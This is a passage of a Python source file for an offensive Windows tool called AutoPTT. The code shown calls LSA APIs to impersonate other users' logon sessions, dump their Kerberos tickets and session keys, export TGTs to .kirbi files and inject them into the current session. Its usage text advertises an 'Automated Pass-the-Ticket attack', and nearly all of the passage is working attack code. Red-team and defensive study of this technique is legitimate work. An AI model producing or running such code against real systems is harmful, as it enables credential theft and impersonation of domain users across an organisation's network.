                print(f"    EndTime                  :  {end_time.strftime('%m/%d/%Y %H:%M:%S')}")
                print(f"    RenewTill                :  {renew_time.strftime('%m/%d/%Y %H:%M:%S')}")
                print(f"    Flags                    :  {flags_str}")
                
                ticket_bytes, session_key_bytes, key_type = request_service_ticket(
                    lsa_handle, auth_pack.value, session_luid, server_name, ticket_info.TicketFlags
                )
                
                if session_key_bytes:
                    base64_key = base64.b64encode(session_key_bytes).decode('ascii')
                    print(f"    Base64(key)              :  {base64_key}")
                else:
                    print(f"    Base64(key)              :  (not available)")
                
                print(f"    Base64EncodedTicket   :")
                if ticket_bytes:
                    base64_ticket = base64.b64encode(ticket_bytes).decode('ascii')
                    print(f"      {base64_ticket}")
                else:
                    print(f"      (failed to retrieve)")
                
                print()
        
        LsaFreeReturnBuffer(response_ptr)
        LsaFreeReturnBuffer(session_data_ptr)
    
    if print_tickets:
        print("=" * 80)
        print("  SUMMARY")
        print("=" * 80)
        print(f"Total logon sessions analyzed: {total_sessions}")
        print(f"Sessions with Kerberos tickets: {sessions_with_tickets}")
        print(f"Total tickets found: {total_tickets}")
        print(f"  - TGTs: {tgt_count}")
        print(f"  - Service Tickets: {service_count}")
    
    LsaFreeReturnBuffer(session_list)
    LsaDeregisterLogonProcess(lsa_handle)


def export_ticket(logon_id_str):
    try:
        if logon_id_str.startswith("0x"):
            target_logon_id = int(logon_id_str, 16)
        else:
            target_logon_id = int(logon_id_str, 16)
    except:
        print("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3")
        return
    
    enable_debug_privilege()
    
    session_count = wintypes.ULONG()
    session_list = POINTER(LUID)()
    status = LsaEnumerateLogonSessions(byref(session_count), byref(session_list))
    if status != 0:
        print("[-] Failed to enumerate logon sessions")
        return
    
    target_luid = None
    username = ""
    domain = ""
    
    for i in range(session_count.value):
        if session_list[i].LowPart == target_logon_id:
            target_luid = session_list[i]
            session_data_ptr = POINTER(SECURITY_LOGON_SESSION_DATA)()
            if LsaGetLogonSessionData(byref(session_list[i]), byref(session_data_ptr)) == 0 and session_data_ptr:
                username = unicode_string_to_string(session_data_ptr.contents.UserName)
                domain = unicode_string_to_string(session_data_ptr.contents.LogonDomain)
                LsaFreeReturnBuffer(session_data_ptr)
            break
    
    LsaFreeReturnBuffer(session_list)
    
    if not target_luid:
        print(f"Error: LogonId 0x{target_logon_id:x} not found")
        return
    
    lsa_handle = get_lsa_handle_with_impersonation()
    if not lsa_handle:
        print("[-] Failed to get LSA handle")
        return
    
    h_imp_token = impersonate_session(target_logon_id)
    need_revert = False
    
    if h_imp_token:
        if ImpersonateLoggedOnUser(h_imp_token):
            need_revert = True
        else:
            CloseHandle(h_imp_token)
            h_imp_token = None
    
    pkg_name = LSA_STRING()
    pkg_name_str = b"Kerberos"
    pkg_name.Buffer = ctypes.cast(pkg_name_str, POINTER(ctypes.c_char))
    pkg_name.Length = len(pkg_name_str)
    pkg_name.MaximumLength = len(pkg_name_str) + 1
    
    auth_pack = wintypes.ULONG()
    status = LsaLookupAuthenticationPackage(lsa_handle, byref(pkg_name), byref(auth_pack))
    if status != 0:
        print("[-] Failed to find Kerberos package")
        LsaDeregisterLogonProcess(lsa_handle)
        if need_revert:
            RevertToSelf()
            CloseHandle(h_imp_token)
        return
    
    cache_request = KERB_QUERY_TKT_CACHE_REQUEST()
    cache_request.MessageType = KerbQueryTicketCacheMessage
    cache_request.LogonId.LowPart = 0
    cache_request.LogonId.HighPart = 0
    
    response_ptr = wintypes.LPVOID()
    response_size = wintypes.ULONG()
    protocol_status = wintypes.LONG()
    
    status = LsaCallAuthenticationPackage(
        lsa_handle, auth_pack, byref(cache_request), sizeof(cache_request),
        byref(response_ptr), byref(response_size), byref(protocol_status)
    )
    
    if status != 0 or protocol_status.value != 0:
        print(f"Error: Failed to get ticket cache for LogonId 0x{target_logon_id:x}")
        LsaDeregisterLogonProcess(lsa_handle)
        if need_revert:
            RevertToSelf()
            CloseHandle(h_imp_token)
        return
    
    response_addr = response_ptr.value if hasattr(response_ptr, 'value') else response_ptr
    cache_response = cast(response_addr, POINTER(KERB_QUERY_TKT_CACHE_RESPONSE)).contents
    ticket_count = cache_response.CountOfTickets
    
    target_server = None
    ticket_flags = 0
    tickets_offset = sizeof(KERB_QUERY_TKT_CACHE_RESPONSE)
    
    for i in range(ticket_count):
        ticket_addr = response_addr + tickets_offset + i * sizeof(KERB_TICKET_CACHE_INFO)
        ticket_ptr = cast(ticket_addr, POINTER(KERB_TICKET_CACHE_INFO))
        ticket = ticket_ptr.contents
        server_name = unicode_string_to_string(ticket.ServerName)
        if "krbtgt" in server_name.lower():
            target_server = server_name
            ticket_flags = ticket.TicketFlags
            break
    
    LsaFreeReturnBuffer(response_ptr)
    
    if not target_server:
        print(f"Error: No TGT found for LogonId 0x{target_logon_id:x}")
        LsaDeregisterLogonProcess(lsa_handle)
        if need_revert:
            RevertToSelf()
            CloseHandle(h_imp_token)
        return
    
    target_name_len = len(target_server)
    t_name = LSA_UNICODE_STRING()
    t_name.Length = target_name_len * 2
    t_name.MaximumLength = t_name.Length + 2
    
    target_name_buffer = ctypes.create_unicode_buffer(target_server)
    t_name.Buffer = ctypes.cast(target_name_buffer, wintypes.LPWSTR)
    
    struct_size = sizeof(KERB_RETRIEVE_TKT_REQUEST)
    total_size = struct_size + t_name.MaximumLength
    
    request_buffer = (ctypes.c_byte * total_size)()
    request = KERB_RETRIEVE_TKT_REQUEST.from_buffer(request_buffer)
    
    request.MessageType = KerbRetrieveEncodedTicketMessage
    request.LogonId = LUID(0, 0)
    request.TargetName.Length = t_name.Length
    request.TargetName.MaximumLength = t_name.MaximumLength
    request.TicketFlags = ticket_flags
    request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED
    request.EncryptionType = 0
    request.CredentialsHandle.LowPart = None
    request.CredentialsHandle.HighPart = None
    
    new_target_buffer_offset = struct_size
    ctypes.memmove(
        ctypes.addressof(request_buffer) + new_target_buffer_offset,
        target_name_buffer,
        t_name.MaximumLength
    )
    
    request.TargetName.Buffer = ctypes.cast(
        ctypes.addressof(request_buffer) + new_target_buffer_offset,
        wintypes.LPWSTR
    )
    
    response_ptr2 = wintypes.LPVOID()
    response_size2 = wintypes.ULONG()
    protocol_status2 = wintypes.LONG()
    
    buffer_ptr = ctypes.cast(request_buffer, wintypes.LPVOID)
    
    status = LsaCallAuthenticationPackage(
        lsa_handle,
        auth_pack,
        buffer_ptr,
        total_size,
        byref(response_ptr2),
        byref(response_size2),
        byref(protocol_status2)
    )
    
    if need_revert:
        RevertToSelf()
        CloseHandle(h_imp_token)
    
    if status != 0 or protocol_status2.value != 0 or response_size2.value == 0:
        print(f"Error: Failed to retrieve ticket - Status=0x{status:08X}, SubStatus=0x{protocol_status2.value:08X}")
        if response_ptr2:
            LsaFreeReturnBuffer(response_ptr2)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    full_response_buffer = ctypes.string_at(response_ptr2, response_size2.value)
    response_ptr_typed = cast(response_ptr2, POINTER(KERB_RETRIEVE_TKT_RESPONSE))
    
    if response_ptr_typed.contents.Ticket.EncodedTicketSize <= 0 or not response_ptr_typed.contents.Ticket.EncodedTicket:
        print("[-] Failed to extract ticket data")
        LsaFreeReturnBuffer(response_ptr2)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    ticket_ptr_addr = ctypes.cast(response_ptr_typed.contents.Ticket.EncodedTicket, ctypes.c_void_p).value
    response_base_addr = response_ptr2.value if hasattr(response_ptr2, 'value') else ctypes.cast(response_ptr2, ctypes.c_void_p).value
    ticket_offset = ticket_ptr_addr - response_base_addr
    ticket_size = response_ptr_typed.contents.Ticket.EncodedTicketSize
    ticket_bytes = full_response_buffer[ticket_offset:ticket_offset + ticket_size]
    
    clean_username = username if username else "unknown"
    for char in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '@', ' ', '$']:
        clean_username = clean_username.replace(char, '_')
    
    filename = f"0x{target_logon_id:x}_{clean_username}.kirbi"
    
    with open(filename, 'wb') as f:
        f.write(ticket_bytes)
    
    print("\n[+] TGT ticket exported successfully")
    print(f"    LogonId: 0x{target_logon_id:x}")
    print(f"    User: {domain}\\{username}")
    print(f"    Server: {target_server}")
    print(f"    File: {filename}")
    print(f"    Size: {len(ticket_bytes)} bytes")
    
    LsaFreeReturnBuffer(response_ptr2)
    LsaDeregisterLogonProcess(lsa_handle)


def pass_the_ticket(filename):
    if not os.path.exists(filename):
        print(f"Error: Cannot open file {filename}")
        return
    
    with open(filename, 'rb') as f:
        ticket_data = f.read()
    
    file_size = len(ticket_data)
    
    if file_size <= 0 or file_size > 10 * 1024 * 1024:
        print("[-] Invalid file size")
        return
    
    lsa_handle = wintypes.HANDLE()
    status = LsaConnectUntrusted(byref(lsa_handle))
    if status != 0:
        print(f"[-] LsaConnectUntrusted failed: 0x{status:08x}")
        return
    
    pkg_name = LSA_STRING()
    pkg_name_str = b"Kerberos"
    pkg_name.Buffer = ctypes.cast(pkg_name_str, POINTER(ctypes.c_char))
    pkg_name.Length = len(pkg_name_str)
    pkg_name.MaximumLength = len(pkg_name_str) + 1
    
    auth_pack = wintypes.ULONG()
    status = LsaLookupAuthenticationPackage(lsa_handle, byref(pkg_name), byref(auth_pack))
    if status != 0:
        print(f"[-] LsaLookupAuthenticationPackage failed: 0x{status:08x}")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    struct_size = sizeof(KERB_SUBMIT_TKT_REQUEST)
    submit_size = struct_size + file_size
    
    submit_buffer = ctypes.create_string_buffer(submit_size)
    
    submit_req = KERB_SUBMIT_TKT_REQUEST.from_buffer(submit_buffer)
    submit_req.MessageType = KerbSubmitTicketMessage
    submit_req.LogonId.LowPart = 0
    submit_req.LogonId.HighPart = 0
    submit_req.Flags = 0
    submit_req.Key.KeyType = 0
    submit_req.Key.Length = 0
    submit_req.Key.Offset = 0
    submit_req.KerbCredSize = file_size
    submit_req.KerbCredOffset = struct_size
    
    ctypes.memmove(
        ctypes.addressof(submit_buffer) + struct_size,
        ticket_data,
        file_size
    )
    
    response_ptr = wintypes.LPVOID()
    response_size = wintypes.ULONG()
    protocol_status = wintypes.LONG()
    
    buffer_ptr = ctypes.cast(submit_buffer, wintypes.LPVOID)
    
    status = LsaCallAuthenticationPackage(
        lsa_handle, 
        auth_pack.value,
        buffer_ptr,
        submit_size,
        byref(response_ptr), 
        byref(response_size), 
        byref(protocol_status)
    )
    
    if status != 0 or protocol_status.value != 0:
        print(f"\nError: Failed to import ticket")
        print(f"  Status: 0x{status:08X}")
        print(f"  SubStatus: 0x{protocol_status.value:08X}")
        
        if protocol_status.value == 0xC000018B or protocol_status.value == -1073741429:
            print("  Reason: Invalid or malformed ticket")
        elif protocol_status.value == 0xC0000225 or protocol_status.value == -1073741275:
            print("  Reason: Domain not found")
        elif protocol_status.value == 0xC000005E or protocol_status.value == -1073741730:
            print("  Reason: No valid logon sessions")
        elif protocol_status.value == 0xC000000D or protocol_status.value == -1073741811:
            print("  Reason: Invalid parameter")
        
        if response_ptr:
            LsaFreeReturnBuffer(response_ptr)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    print("\n[+] Ticket imported successfully into memory")
    print(f"    File: {filename}")
    print(f"    Size: {file_size} bytes")
    print("\n[+] Ticket is now available in Kerberos cache")
    print(f"    You can verify with: {sys.argv[0]} klist")
    
    if response_ptr:
        LsaFreeReturnBuffer(response_ptr)
    LsaDeregisterLogonProcess(lsa_handle)


def auto_export_and_import():
    global g_tgt_list
    g_tgt_list = []
    
    print("[*] Auto mode: Enumerating tickets and importing selected TGT...")
    print_current_logon_id()
    
    enable_debug_privilege()
    
    lsa_handle = get_lsa_handle_with_impersonation()
    if not lsa_handle:
        print("[-] Failed to get LSA handle")
        return
    
    pkg_name = LSA_STRING()
    pkg_name_str = b"Kerberos"
    pkg_name.Buffer = ctypes.cast(pkg_name_str, POINTER(ctypes.c_char))
    pkg_name.Length = len(pkg_name_str)
    pkg_name.MaximumLength = len(pkg_name_str) + 1
    
    auth_pack = wintypes.ULONG()
    status = LsaLookupAuthenticationPackage(lsa_handle, byref(pkg_name), byref(auth_pack))
    if status != 0:
        print(f"[-] Failed to lookup Kerberos package: 0x{status:08x}")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    session_count = wintypes.ULONG()
    session_list = POINTER(LUID)()
    status = LsaEnumerateLogonSessions(byref(session_count), byref(session_list))
    if status != 0:
        print(f"[-] Failed to enumerate sessions: 0x{status:08x}")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    for i in range(session_count.value):
        session_luid = session_list[i]
        
        session_data_ptr = POINTER(SECURITY_LOGON_SESSION_DATA)()
        status = LsaGetLogonSessionData(byref(session_luid), byref(session_data_ptr))
        if status != 0 or not session_data_ptr:
            continue
        
        session_data = session_data_ptr.contents
        username = unicode_string_to_string(session_data.UserName)
        domain = unicode_string_to_string(session_data.LogonDomain)
        
        if not username:
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        cache_request = KERB_QUERY_TKT_CACHE_REQUEST()
        cache_request.MessageType = KerbQueryTicketCacheExMessage
        cache_request.LogonId = session_luid
        
        response_ptr = wintypes.LPVOID()
        response_size = wintypes.ULONG()
        protocol_status = wintypes.LONG()
        
        status = LsaCallAuthenticationPackage(
            lsa_handle, auth_pack, byref(cache_request), sizeof(cache_request),
            byref(response_ptr), byref(response_size), byref(protocol_status)
        )
        
        if status != 0 or protocol_status.value != 0 or not response_ptr:
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        response_addr = response_ptr.value if hasattr(response_ptr, 'value') else response_ptr
        cache_response = cast(response_addr, POINTER(KERB_QUERY_TKT_CACHE_RESPONSE)).contents
        ticket_count = cache_response.CountOfTickets
        
        if ticket_count == 0:
            LsaFreeReturnBuffer(response_ptr)
            LsaFreeReturnBuffer(session_data_ptr)
            continue
        
        tickets_offset = sizeof(KERB_QUERY_TKT_CACHE_RESPONSE)
        
        for j in range(ticket_count):
            ticket_addr = response_addr + tickets_offset + j * sizeof(KERB_TICKET_CACHE_INFO_EX)
            ticket_ptr = cast(ticket_addr, POINTER(KERB_TICKET_CACHE_INFO_EX))
            ticket_info = ticket_ptr.contents
            
            server_name = unicode_string_to_string(ticket_info.ServerName)
            
            is_tgt = "krbtgt" in server_name.lower()
            if is_tgt:
                add_tgt_to_list(session_luid.LowPart, username, domain, server_name)
        
        LsaFreeReturnBuffer(response_ptr)
        LsaFreeReturnBuffer(session_data_ptr)
    
    LsaFreeReturnBuffer(session_list)
    
    if len(g_tgt_list) == 0:
        print("\nNo TGTs found on the system.")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    print("\n" + "=" * 80)
    print("  AVAILABLE TGTs")
    print("=" * 80)
    print(f"{'Index':<6} {'LogonId':<12} {'User':<30} {'Domain':<20} Service")
    print(f"{'-'*6} {'-'*12} {'-'*30} {'-'*20} {'-'*32}")
    
    for idx, tgt in enumerate(g_tgt_list):
        print(f"{idx+1:<6} 0x{tgt['logon_id']:<10x} {tgt['username']:<30} {tgt['domain']:<20} {tgt['service_name']}")
    
    print(f"\nChoose TGT to export and import (1-{len(g_tgt_list)}), or 0 to cancel: ", end='')
    try:
        choice = int(input())
    except:
        print("Cancelled or invalid choice.")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    if choice <= 0 or choice > len(g_tgt_list):
        print("Cancelled or invalid choice.")
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    selected_tgt = g_tgt_list[choice - 1]
    target_logon_id = selected_tgt['logon_id']
    
    print(f"\n[*] Selected: #{choice} - 0x{target_logon_id:x} ({selected_tgt['username']})")
    
    h_imp_token = impersonate_session(target_logon_id)
    need_revert = False
    
    if h_imp_token:
        if ImpersonateLoggedOnUser(h_imp_token):
            need_revert = True
        else:
            CloseHandle(h_imp_token)
            h_imp_token = None
    
    cache_request = KERB_QUERY_TKT_CACHE_REQUEST()
    cache_request.MessageType = KerbQueryTicketCacheMessage
    cache_request.LogonId.LowPart = 0
    cache_request.LogonId.HighPart = 0
    
    response_ptr = wintypes.LPVOID()
    response_size = wintypes.ULONG()
    protocol_status = wintypes.LONG()
    
    status = LsaCallAuthenticationPackage(
        lsa_handle, auth_pack, byref(cache_request), sizeof(cache_request),
        byref(response_ptr), byref(response_size), byref(protocol_status)
    )
    
    if status != 0 or protocol_status.value != 0:
        print("[-] Failed to get ticket cache")
        if need_revert:
            RevertToSelf()
            CloseHandle(h_imp_token)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    response_addr = response_ptr.value if hasattr(response_ptr, 'value') else response_ptr
    cache_response = cast(response_addr, POINTER(KERB_QUERY_TKT_CACHE_RESPONSE)).contents
    ticket_count = cache_response.CountOfTickets
    
    target_server = None
    ticket_flags = 0
    tickets_offset = sizeof(KERB_QUERY_TKT_CACHE_RESPONSE)
    
    for i in range(ticket_count):
        ticket_addr = response_addr + tickets_offset + i * sizeof(KERB_TICKET_CACHE_INFO)
        ticket_ptr = cast(ticket_addr, POINTER(KERB_TICKET_CACHE_INFO))
        ticket = ticket_ptr.contents
        server_name = unicode_string_to_string(ticket.ServerName)
        if "krbtgt" in server_name.lower():
            target_server = server_name
            ticket_flags = ticket.TicketFlags
            break
    
    LsaFreeReturnBuffer(response_ptr)
    
    if not target_server:
        print("[-] TGT not found in cache")
        if need_revert:
            RevertToSelf()
            CloseHandle(h_imp_token)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    target_name_len = len(target_server)
    t_name = LSA_UNICODE_STRING()
    t_name.Length = target_name_len * 2
    t_name.MaximumLength = t_name.Length + 2
    
    target_name_buffer = ctypes.create_unicode_buffer(target_server)
    t_name.Buffer = ctypes.cast(target_name_buffer, wintypes.LPWSTR)
    
    struct_size = sizeof(KERB_RETRIEVE_TKT_REQUEST)
    total_size = struct_size + t_name.MaximumLength
    
    request_buffer = (ctypes.c_byte * total_size)()
    request = KERB_RETRIEVE_TKT_REQUEST.from_buffer(request_buffer)
    
    request.MessageType = KerbRetrieveEncodedTicketMessage
    request.LogonId = LUID(0, 0)
    request.TargetName.Length = t_name.Length
    request.TargetName.MaximumLength = t_name.MaximumLength
    request.TicketFlags = ticket_flags
    request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED
    request.EncryptionType = 0
    request.CredentialsHandle.LowPart = None
    request.CredentialsHandle.HighPart = None
    
    new_target_buffer_offset = struct_size
    ctypes.memmove(
        ctypes.addressof(request_buffer) + new_target_buffer_offset,
        target_name_buffer,
        t_name.MaximumLength
    )
    
    request.TargetName.Buffer = ctypes.cast(
        ctypes.addressof(request_buffer) + new_target_buffer_offset,
        wintypes.LPWSTR
    )
    
    response_ptr2 = wintypes.LPVOID()
    response_size2 = wintypes.ULONG()
    protocol_status2 = wintypes.LONG()
    
    buffer_ptr = ctypes.cast(request_buffer, wintypes.LPVOID)
    
    status = LsaCallAuthenticationPackage(
        lsa_handle,
        auth_pack,
        buffer_ptr,
        total_size,
        byref(response_ptr2),
        byref(response_size2),
        byref(protocol_status2)
    )
    
    if need_revert:
        RevertToSelf()
        CloseHandle(h_imp_token)
    
    if status != 0 or protocol_status2.value != 0 or response_size2.value == 0:
        print(f"[-] Failed to retrieve ticket - Status=0x{status:08X}, SubStatus=0x{protocol_status2.value:08X}")
        if response_ptr2:
            LsaFreeReturnBuffer(response_ptr2)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    full_response_buffer = ctypes.string_at(response_ptr2, response_size2.value)
    response_ptr_typed = cast(response_ptr2, POINTER(KERB_RETRIEVE_TKT_RESPONSE))

    if response_ptr_typed.contents.Ticket.EncodedTicketSize <= 0 or not response_ptr_typed.contents.Ticket.EncodedTicket:
        print("[-] Failed to extract ticket data")
        LsaFreeReturnBuffer(response_ptr2)
        LsaDeregisterLogonProcess(lsa_handle)
        return

    ticket_ptr_addr = ctypes.cast(response_ptr_typed.contents.Ticket.EncodedTicket, ctypes.c_void_p).value
    response_base_addr = response_ptr2.value if hasattr(response_ptr2, 'value') else ctypes.cast(response_ptr2, ctypes.c_void_p).value
    ticket_offset = ticket_ptr_addr - response_base_addr
    ticket_size = response_ptr_typed.contents.Ticket.EncodedTicketSize
    ticket_bytes = full_response_buffer[ticket_offset:ticket_offset + ticket_size]
    
    print("[+] Ticket retrieved successfully")
    print(f"    Size: {len(ticket_bytes)} bytes")
    
    LsaFreeReturnBuffer(response_ptr2)
    
    print("\n[*] Importing ticket into current session...")
    
    submit_size = sizeof(KERB_SUBMIT_TKT_REQUEST) + len(ticket_bytes)
    submit_buffer = ctypes.create_string_buffer(submit_size)
    
    submit_req = KERB_SUBMIT_TKT_REQUEST.from_buffer(submit_buffer)
    submit_req.MessageType = KerbSubmitTicketMessage
    submit_req.LogonId.LowPart = 0
    submit_req.LogonId.HighPart = 0
    submit_req.Flags = 0
    submit_req.Key.KeyType = 0
    submit_req.Key.Length = 0
    submit_req.Key.Offset = 0
    submit_req.KerbCredSize = len(ticket_bytes)
    submit_req.KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST)
    
    ctypes.memmove(
        ctypes.addressof(submit_buffer) + sizeof(KERB_SUBMIT_TKT_REQUEST),
        ticket_bytes,
        len(ticket_bytes)
    )
    
    response_ptr3 = wintypes.LPVOID()
    response_size3 = wintypes.ULONG()
    protocol_status3 = wintypes.LONG()
    
    buffer_ptr = ctypes.cast(submit_buffer, wintypes.LPVOID)
    
    status = LsaCallAuthenticationPackage(
        lsa_handle, 
        auth_pack.value,
        buffer_ptr,
        submit_size,
        byref(response_ptr3), 
        byref(response_size3), 
        byref(protocol_status3)
    )
    
    if status != 0 or protocol_status3.value != 0:
        print(f"\nError: Failed to import ticket")
        print(f"  Status: 0x{status:08X}")
        print(f"  SubStatus: 0x{protocol_status3.value:08X}")
        
        if protocol_status3.value == 0xC000018B or protocol_status3.value == -1073741429:
            print("  Reason: Invalid or malformed ticket")
        elif protocol_status3.value == 0xC0000225 or protocol_status3.value == -1073741275:
            print("  Reason: Domain not found")
        elif protocol_status3.value == 0xC000005E or protocol_status3.value == -1073741730:
            print("  Reason: No valid logon sessions")
        elif protocol_status3.value == 0xC000000D or protocol_status3.value == -1073741811:
            print("  Reason: Invalid parameter")
        
        if response_ptr3:
            LsaFreeReturnBuffer(response_ptr3)
        LsaDeregisterLogonProcess(lsa_handle)
        return
    
    print("\n[+] TGT imported successfully into current session")
    print(f"    LogonId: 0x{target_logon_id:x}")
    print(f"    User: {selected_tgt['username']}")
    print(f"    Service: {target_server}")
    print("\n[+] Ticket is now available in your Kerberos cache")
    print(f"    You can verify with: {sys.argv[0]} klist")
    
    if response_ptr3:
        LsaFreeReturnBuffer(response_ptr3)
    LsaDeregisterLogonProcess(lsa_handle)


def print_banner():
    banner = r"""
     ___         __       ___  ____________
    / _ | __ __ / /_ ___ / _ \/_  __/_  __/
   / __ |/ // // __// _ \/ ___/ / /   / /   
  /_/ |_|\_,_/ \__/ \___/_/    /_/   /_/    

  v1.1 - Kerberos Ticket Enumerator (Python)
  sessions, klist, tickets, export, ptt, auto
"""
    print(banner)


def main():
    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        if command == "sessions":
            print_current_logon_id()
            enumerate_logon_sessions()
        elif command == "klist":
            print_current_logon_id()
            enumerate_my_tickets()
        elif command == "tickets":
            print_current_logon_id()
            enumerate_all_tickets(print_tickets=True)
        elif command == "export" and len(sys.argv) > 2:
            export_ticket(sys.argv[2])
        elif command == "ptt" and len(sys.argv) > 2:
            pass_the_ticket(sys.argv[2])
        elif command == "auto":
            auto_export_and_import()
        else:
            print_banner()
            print("Usage:")
            print(f"  {sys.argv[0]} auto             - Automated Pass-the-Ticket attack")
            print(f"  {sys.argv[0]} sessions         - List all logon sessions")
            print(f"  {sys.argv[0]} klist            - List tickets in current session")
            print(f"  {sys.argv[0]} tickets          - List all tickets from all sessions")
            print(f"  {sys.argv[0]} export <LogonId> - Export a TGT given the LogonId")
            print(f"  {sys.argv[0]} ptt <file>       - Import a ticket file given the file name")
            print()
    else:
        print_banner()
        print("Usage:")
        print(f"  {sys.argv[0]} auto             - Automated Pass-the-Ticket attack")
        print(f"  {sys.argv[0]} sessions         - List all logon sessions")
        print(f"  {sys.argv[0]} klist            - List tickets in current session")
        print(f"  {sys.argv[0]} tickets          - List all tickets from all sessions")
        print(f"  {sys.argv[0]} export <LogonId> - Export a TGT given the LogonId")
        print(f"  {sys.argv[0]} ptt <file>       - Import a ticket file given the file name")
        print()


if __name__ == "__main__":
    main()